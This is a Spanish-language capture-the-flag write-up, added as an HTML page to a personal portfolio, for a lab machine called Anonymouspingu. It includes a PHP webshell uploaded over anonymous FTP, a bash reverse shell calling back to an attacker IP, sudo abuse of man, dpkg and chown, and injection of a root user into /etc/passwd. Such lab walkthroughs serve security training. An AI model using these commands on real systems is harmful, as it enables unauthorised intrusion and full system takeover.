@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Write‑up: Anonymouspingu</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</head>
+
+<body class="bg-gray-900 text-white">
+    <!-- NAVBAR -->
+    <nav class="bg-gray-800 text-white sticky top-0 z-50 shadow-md">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div class="flex justify-between items-center h-16">
+            <div class="flex-shrink-0">
+            <h1 class="font-semibold">Santiago Lorenzo</h1>
+            </div>
+            <div class="hidden md:flex space-x-4">
+                <a href="../index.html#inicio" class="hover:text-blue-400 transition">Inicio</a>
+                <a href="../index.html#certificados" class="hover:text-blue-400 transition">Certificaciones</a>
+                <a href="../index.html#proyectos" class="hover:text-blue-400 transition">Proyectos</a>
+                <a href="../writeup.html" class="hover:text-blue-400 transition">Write‑ups</a>
+            </div>
+        </div>
+        </div>
+    </nav>
+
+    <main class="max-w-4xl mx-auto px-6 py-12">
+        <h1 class="text-4xl font-bold mb-2">❄️ Máquina: Anonymouspingu</h1>
+        <p class="text-gray-400 text-sm mb-8">📅 Publicado el 13/09/2025 | Categoría: LINUX </p>
+
+        <!-- DESCRIPCIÓN -->
+        <section class="mb-10">
+        <h2 class="text-2xl font-semibold mb-2">📝 Descripción</h2>
+        <p class="text-gray-300 leading-relaxed">
+            Enumeración inicial con FTP anónimo y servidor web, explotación mediante subida de webshell y ejecución remota de comandos, 
+            escalada de privilegios en cadena a través de usuarios (www-data → pingu → gladys) 
+            y abuso de sudo chown para modificar /etc/passwd, logrando finalmente acceso root. <code>root</code>.
+        </p>
+        </section>
+
+        <!-- RECON -->
+        <section class="mb-10">
+        <h2 class="text-2xl font-semibold mb-2">🔍 Reconocimiento</h2>
+        <pre><code class="language-bash">
+            sudo nmap -p- -open -O -sS -sCV -min-rate 5000 -n -Pn 172.17.0.2
+
+            PORT   STATE SERVICE VERSION
+            21/tcp open  ftp     vsftpd 3.0.5
+            | ftp-syst: 
+            |   STAT: 
+            | FTP server status:
+            |      Connected to ::ffff:172.17.0.1
+            |      Logged in as ftp
+            |      TYPE: ASCII
+            |      No session bandwidth limit
+            |      Session timeout in seconds is 300
+            |      Control connection is plain text
+            |      Data connections will be plain text
+            |      At session startup, client count was 4
+            |      vsFTPd 3.0.5 - secure, fast, stable
+            |_End of status
+            | ftp-anon: Anonymous FTP login allowed (FTP code 230)
+            | -rw-r--r--    1 0        0            7816 Nov 25  2019 about.html
+            | -rw-r--r--    1 0        0            8102 Nov 25  2019 contact.html
+            | drwxr-xr-x    2 0        0            4096 Jan 01  1970 css
+            | drwxr-xr-x    2 0        0            4096 Apr 28  2024 heustonn-html
+            | drwxr-xr-x    2 0        0            4096 Oct 23  2019 images
+            | -rw-r--r--    1 0        0           20162 Apr 28  2024 index.html
+            | drwxr-xr-x    2 0        0            4096 Oct 23  2019 js
+            | -rw-r--r--    1 0        0            9808 Nov 25  2019 service.html
+            |_drwxrwxrwx    1 33       33           4096 Apr 28  2024 upload [NSE: writeable]
+            80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+            |_http-server-header: Apache/2.4.58 (Ubuntu)
+            |_http-title: Mantenimiento
+
+
+        </code></pre>
+        </section> 
+
+        <!-- WEB ENUM -->
+        <section class="mb-10">
+            <h2 class="text-2xl font-semibold mb-2">🌐 Enumeración Web</h2>
+            <pre><code class="language-bash">gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50
+
+            /index.html           (Status: 200) [Size: 20162]
+            /images               (Status: 301) [Size: 309] [--> http://172.17.0.2/images/]
+            /about.html           (Status: 200) [Size: 7816]
+            /contact.html         (Status: 200) [Size: 8102]
+            /upload               (Status: 301) [Size: 309] [--> http://172.17.0.2/upload/]
+            /service.html         (Status: 200) [Size: 9808]
+            /css                  (Status: 301) [Size: 306] [--> http://172.17.0.2/css/]
+            /js                   (Status: 301) [Size: 305] [--> http://172.17.0.2/js/]
+            </code></pre>
+            
+            <p class="text-gray-300">El directorio <code>/upload.php</code> nos importa.</p>
+        </section>
+
+        <section class="mb-10">
+            <p class="text-gray-300">entramos a ftp con <code>ftp 172.17.0.2</code> como usuario Anonymous</p>
+            
+            <pre><code class="language-bash">
+                #es <?php "contenido" ?>
+                echo '< system($_GET["cmd"]); ?>' > shell.php
+
+                #subimos Shell.php a upload
+
+                ftp> put shell.php
+            </code></pre>
+
+            <p class="text-gray-300">Y nos dirigimos hacia los subido:</p>
+
+            <img src="../Assets/anonymouspingu/1-lfi.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="inicio">
+
+            
+            <p class="text-gray-300">Ahora creamos una reser shell</p>
+            
+
+            <p class="text-gray-300">
+                nos ponemos a la escucha del puerto
+            </p>
+            <pre><code class="language-bash">
+            nc -lvnp 4444
+            </code></pre>
+
+            <p class="text-gray-300">y en el directorio lanzamos la shell:
+            </p>
+            <pre><code class="language-bash">
+http://172.17.0.2/upload/shell.php?cmd=/bin/bash+-c+'bash+-i+>%26+/dev/tcp/192.168.1.14/4444+0>%261'
+            </code></pre>
+            <p class="text-gray-300">
+                Con esto entramos al ssh con el usuario www-data
+            </p>
+        </section>
+
+        <!-- ROOT -->
+        <section class="mb-10">
+        <h2 class="text-2xl font-semibold mb-2">👑 Escalada a root</h2>
+        <p class="text-gray-300">Si hacemos sudo -l vemos que podemos ejecutar man como el usuario pingu. 
+            Podemos abusar de este para migrar a ese user.</p>
+
+        <pre><code class="language-bash">
+        sudo -l
+            User www-data may run the following commands on 13d79de146ba:
+                (pingu) NOPASSWD: /usr/bin/man
+        
+        #migramos al usario pingu
+        sudo -u pingu /usr/bin/man man
+
+        !/bin/bash
+        </code></pre>
+
+        <p class="text-gray-300">
+            Hacemos otra vez un <code>sudo -l</code> .
+        </p>
+
+        <pre><code class="language-bash">
+            sudo -l
+
+            User pingu may run the following commands on 4af23574d013:
+                (gladys) NOPASSWD: /usr/bin/nmap
+                (gladys) NOPASSWD: /usr/bin/dpkg
+        </code></pre>
+        <p class="text-gray-300">
+            Aprovechamos que podemos ejecutar dpkg como gladys
+        </p>
+        <pre><code class="language-bash">
+        sudo -u gladys /usr/bin/dpkg -l
+
+        !/bin/bash
+        </code></pre>
+        <p class="text-gray-300">
+            Migramos al user gladys. Hacemos otra vez <code>sudo -l</code>:
+        </p>
+        <pre><code class="language-bash">
+        sudo -l
+
+            User gladys may run the following commands on 4af23574d013:
+                (root) NOPASSWD: /usr/bin/chown
+        </code></pre>
+
+        <p class="text-gray-300">
+            Esto significa que gladys puede cambiar el propietario (chown) de cualquier archivo.
+        </p>
+        <pre><code class="language-bash">
+        LFILE=/etc/passwd 
+        #cambio de propietario
+        sudo chown $(id -un):$(id -gn) $LFILE
+        ls -l /etc/passwd
+        
+        -rw-r--r-- 1 gladys gladys 1292 Apr 28 21:08 /etc/passwd
+        </code></pre>
+        <p class="text-gray-300">
+            Inyección de nuevo usuario root:
+        </p>
+        <pre><code class="language-bash">
+        openssl passwd hola123
+        echo 'newroot:$1$EBhVbkUV$zW3uLFiknxfdzUV5OjQZ40:0:0::/home/newroot:/bin/bash' >> /etc/passwd
+        su newroot
+        whoami
+        root
+        </code></pre>
+        </section>
+
+        <!-- RESULTADO -->
+        <section class="mb-12">
+        <h2 class="text-2xl font-semibold mb-2">🏁 Resultado</h2>
+        <p class="text-gray-300">Acceso total a la máquina con privilegios de <code>root</code></p>
+        </section>
+
+        <div class="mt-10">
+        <a href="../writeup.html" class="inline-block bg-blue-500 px-6 py-2 rounded-lg text-white hover:bg-blue-700 transition">
+            ← Volver a la lista de Write‑ups
+        </a>
+        </div>
+    </main>
+    </body>
+</html>
